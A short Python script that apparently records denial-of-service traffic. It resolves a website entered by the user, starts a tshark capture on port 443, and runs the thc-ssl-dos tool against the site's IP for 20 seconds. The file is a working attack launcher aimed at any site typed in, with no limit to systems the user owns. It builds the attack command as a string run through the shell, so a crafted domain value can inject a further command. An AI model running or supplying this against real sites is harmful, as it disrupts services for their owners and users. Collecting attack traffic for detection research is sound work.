import os
import datetime
import subprocess
import socket
import time
import sys

file_path = os.path.join("output/dos_traffic/" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
failed_domain = []

if not os.path.exists(file_path):
    os.makedirs(file_path)

# Insert website here
domain_socket = ""

# Getting list of possible ip from the particular domain
ip_list = []
try:
    socket_info = socket.getaddrinfo(domain_socket, None)
except socket.gaierror as e:
    failed_domain.append(domain_socket)
    socket_info = ""

# Appending possible IP to input from the domain
for info in socket_info:
    ip = info[4][0]
    if ip not in ip_list and ":" not in ip:
        ip_list.append(ip)

# Initializer for tshark
# SNIFFER
# Declaring variables for the sniffer
# Capture filter ip_list[0] is taken as the first IP resolved to capture
# Might not be too perfect in the case
abspath = os.path.abspath(file_path)
interface = "eth0"
capture_filter = "tcp port 443 and host " + ip_list[0]
filename = abspath + "/" + domain_socket + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
print(filename)
# Raw capturing
FNULL = open(os.devnull, 'w')
sniff_command = ["tshark", "-i", interface, "-c 5000", "-f", capture_filter, "-w", filename]
sniff_process = subprocess.Popen(sniff_command, shell=False)

for ip in ip_list:
    # Initializer for thc-ssl-dos
    # Declaring variables for thc-ssl-dos
    parallel_connections = 10
    port = 443

    # thc_command = ["thc-ssl-dos", "-l", parallel_connections, ip, port, "--accept"]
    thc_command = "thc-ssl-dos -l " + str(parallel_connections) + " " + ip + " " + str(port) + " " + "--accept"
    GNULL = open(os.devnull, 'w')
    thc_process = subprocess.Popen(thc_command, shell=True, stdout=GNULL)

    # Sleeping for 10 seconds before killing them off
    time.sleep(20)
    kill_thc = "killall thc-ssl-dos"
    kill_sniff = "killall tshark"
    os.system(kill_thc)
    os.system(kill_sniff)
    break

sys.exit()




